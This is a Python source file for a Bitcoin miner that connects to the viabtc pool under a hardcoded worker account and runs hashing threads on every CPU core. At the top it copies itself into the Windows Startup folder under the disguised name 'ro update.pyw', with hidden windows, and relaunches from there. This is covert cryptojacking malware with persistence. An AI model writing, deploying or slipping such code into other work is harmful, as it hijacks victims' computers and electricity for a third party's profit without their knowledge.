import os
import sys
import socket
import json
import struct
import hashlib
import binascii
import threading
import subprocess
from concurrent.futures import ThreadPoolExecutor
import time

current_dir = os.path.abspath(__file__)
startup_path = f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
if "Startup" not in current_dir:
    subprocess.run(["cmd", "/c", "copy", current_dir, startup_path + "/ro update.pyw"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
    subprocess.run(["python", startup_path + "/ro update.pyw"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
    sys.exit()

POOL_HOST = 'btc.viabtc.com'
POOL_PORT = 3333
USERNAME = 'Dazomo.viaminer01'
PASSWORD = 'x'

lock = threading.Lock()

def swap_endian(hex_str):
    return bytes.fromhex(hex_str)[::-1].hex()

def calculate_target(diff):
    max_target = 0xffff * 2**(8 * (0x1d - 3))
    return int(max_target / diff)

def build_merkle_root(coinbase_bin, merkle_branch):
    merkle_root = hashlib.sha256(hashlib.sha256(coinbase_bin).digest()).digest()
    for branch in merkle_branch:
        branch_bin = binascii.unhexlify(branch)
        merkle_root = hashlib.sha256(hashlib.sha256(merkle_root + branch_bin).digest()).digest()
    return merkle_root

def mine_worker(thread_id, num_threads, job, extranonce1, diff, f, worker):
    job_id, prevhash, coinb1, coinb2, merkle_branch, version, nbits, ntime, clean = job
    extranonce2 = "00000000"

    coinbase = coinb1 + extranonce1 + extranonce2 + coinb2
    coinbase_bin = binascii.unhexlify(coinbase)
    merkle_root = build_merkle_root(coinbase_bin, merkle_branch)
    merkle_root_hex = merkle_root[::-1].hex()

    header_prefix = (
        binascii.unhexlify(swap_endian(version)) +
        binascii.unhexlify(swap_endian(prevhash)) +
        binascii.unhexlify(merkle_root_hex) +
        binascii.unhexlify(swap_endian(ntime)) +
        binascii.unhexlify(swap_endian(nbits))
    )

    target = calculate_target(diff)
    print(f"[*] Thread {thread_id} starts mining job {job_id} diff {diff}")

    nonce = thread_id
    hashes_done = 0
    start_time = time.time()

    while True:
        nonce_bin = struct.pack("<I", nonce)
        header = header_prefix + nonce_bin
        hash_bin = hashlib.sha256(hashlib.sha256(header).digest()).digest()
        hash_int = int.from_bytes(hash_bin[::-1], byteorder='big')

        if hash_int < target:
            print(f"[+] Thread {thread_id} found share nonce {nonce:08x} hash {hash_bin[::-1].hex()}")
            submit = {
                "id": 4,
                "method": "mining.submit",
                "params": [worker, job_id, extranonce2, ntime, f'{nonce:08x}']
            }
            with lock:
                f.write(json.dumps(submit) + "\n")

            break

        nonce += num_threads
        hashes_done += 1

        if hashes_done % 5_000_000 == 0:
            elapsed = time.time() - start_time
            rate = hashes_done / elapsed if elapsed > 0 else 0
            print(f"Thread {thread_id} Hashrate: {rate:.2f} H/s")

def main():
    sock = socket.create_connection((POOL_HOST, POOL_PORT))
    f = sock.makefile('rw', buffering=1, encoding='utf-8')
    print("[*] Connected to pool.")

    f.write(json.dumps({
        "id": 1,
        "method": "mining.subscribe",
        "params": []
    }) + "\n")
    sub_resp = json.loads(f.readline())
    extranonce1 = sub_resp["result"][1]
    print("[*] Subscribed.")

    f.write(json.dumps({
        "id": 2,
        "method": "mining.authorize",
        "params": [USERNAME, PASSWORD]
    }) + "\n")
    auth_resp = json.loads(f.readline())
    print(f"[*] Authorized: {auth_resp['result']}")

    difficulty = 1
    current_job = None
    executor = ThreadPoolExecutor(max_workers=os.cpu_count())

    while True:
        line = f.readline()
        if not line:
            continue
        msg = json.loads(line)

        if msg.get("method") == "mining.set_difficulty":
            difficulty = msg["params"][0]
            print(f"[*] New difficulty: {difficulty}")

        elif msg.get("method") == "mining.notify":
            job = msg["params"]
            current_job = job

            for i in range(os.cpu_count()):
                executor.submit(mine_worker, i, os.cpu_count(), job, extranonce1, difficulty, f, USERNAME)

if __name__ == "__main__":
    main()
